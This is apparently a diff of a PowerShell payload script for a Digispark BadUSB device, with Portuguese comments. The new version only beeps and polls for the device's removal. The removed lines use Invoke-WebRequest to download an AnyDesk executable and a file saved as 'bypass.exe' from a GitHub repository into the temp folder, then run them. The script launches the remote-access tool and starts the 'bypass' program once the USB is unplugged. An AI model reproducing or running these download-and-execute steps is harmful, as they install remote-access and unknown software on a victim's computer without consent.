@@ -1,35 +1,29 @@
-$p = "$env:TEMP\main.exe"
-$b = "$env:TEMP\bypass.exe"
-$n = "AnyDesk"
+# 1. Toca um som médio para avisar: "O Script começou e estou vigiando!"
+[System.Console]::Beep(1000, 500)
 
-# Baixa os arquivos
-Invoke-WebRequest -Uri "https://github.com/nohanvs/bot-dc-dipariss7k/raw/refs/heads/main/AnyDesk.exe" -OutFile $p
-Invoke-WebRequest -Uri "https://github.com/nohanvs/bot-dc-dipariss7k/raw/refs/heads/main/SYNC-Otimizer.exe" -OutFile $b
+# Espera 3 segundos para estabilizar
+Start-Sleep -Seconds 3
 
-# Inicia o principal
-Start-Process $p
-
-# Espera de segurança de 5 segundos para o USB estabilizar antes de começar a vigiar
-Start-Sleep -Seconds 5
-
-# O Loop Vigilante com Prova Real
+# Loop Vigilante (O segredo novo é o ConfigManagerErrorCode)
 while ($true) {
-    # Tenta achar o Digispark (ID 16D0)
-    $usb = Get-WmiObject Win32_PnPEntity | Where-Object { $_.DeviceID -match '16D0' }
-    
+    # Busca o Digispark (16D0). 
+    # ConfigManagerErrorCode -eq 0 significa que ele ignora "fantasmas" e exige que o USB esteja 100% ativo.
+    $usb = Get-WmiObject Win32_PnPEntity | Where-Object { $_.DeviceID -match '16D0' -and $_.ConfigManagerErrorCode -eq 0 }
+
     if (-not $usb) {
-        # Se não achou, espera 2 segundos e tira a Prova Real
-        Start-Sleep -Seconds 2
-        $usb_confirm = Get-WmiObject Win32_PnPEntity | Where-Object { $_.DeviceID -match '16D0' }
-        
-        if (-not $usb_confirm) {
-            # Se continuar sumido, é porque você realmente puxou da tomada! Quebra o loop.
+        # Tirou? Faz a prova real (espera 1 segundo)
+        Start-Sleep -Seconds 1
+        $confirm = Get-WmiObject Win32_PnPEntity | Where-Object { $_.DeviceID -match '16D0' -and $_.ConfigManagerErrorCode -eq 0 }
+
+        if (-not $confirm) {
+            # SUCESSO! O USB sumiu de verdade.
+            # Toca um alarme agudo 5 vezes rápido!
+            for($i=0; $i -lt 5; $i++){
+                [System.Console]::Beep(2500, 200)
+                Start-Sleep -Milliseconds 100
+            }
             break
         }
     }
     Start-Sleep -Seconds 1
 }
-
-# Só chega aqui se o USB for arrancado de verdade
-Stop-Process -Name $n -Force -ErrorAction SilentlyContinue
-Start-Process $b
